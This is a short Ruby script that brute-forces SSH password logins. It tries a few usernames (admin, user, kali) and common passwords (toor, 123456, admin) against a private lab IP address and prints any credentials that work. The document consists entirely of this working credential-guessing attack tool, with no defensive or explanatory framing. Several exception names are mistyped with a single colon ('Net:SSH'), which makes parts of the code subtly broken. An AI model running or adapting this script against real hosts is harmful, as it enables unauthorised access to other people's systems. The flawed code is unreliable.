require 'net/ssh' # gem install net-ssh

def attack_ssh(host, user, password, port=22, timeout=5)
    begin
        Net::SSH.start(host,user, :password => password,
        :auth_methods => ["password"], :port => port,
        :non_interactive => true, :timeout => timeout) do |session|
        puts "Password found: #{host} | #{user}:#{password}"
        end
    rescue Net:SSH::ConnectionTimeout
        puts "[!] Host '#{host}' is not alive"
    rescue Net:SSH::Timeout
        puts "[!] Host '#{host}' is offline"
    rescue Errno::ECONNREFUSED
        puts "[!] The wrong port #{port} for the host '#{host}'"
    rescue Net:SSH::AuthenticationFailed
        puts "password incorrect"
    rescue Net:SSH::Authentication::DisallowedMethod
        puts "[!] The host does not accept password"
    end
end
        
hosts = ['192.168.109.128']
users = ['admin','user','kali']
pass = ['toor', '123456', 'admin']

hosts.each do |host|
    users.each do |user|
        pass.each do |pass|
            attack_ssh host, user, pass
        end
    end
end
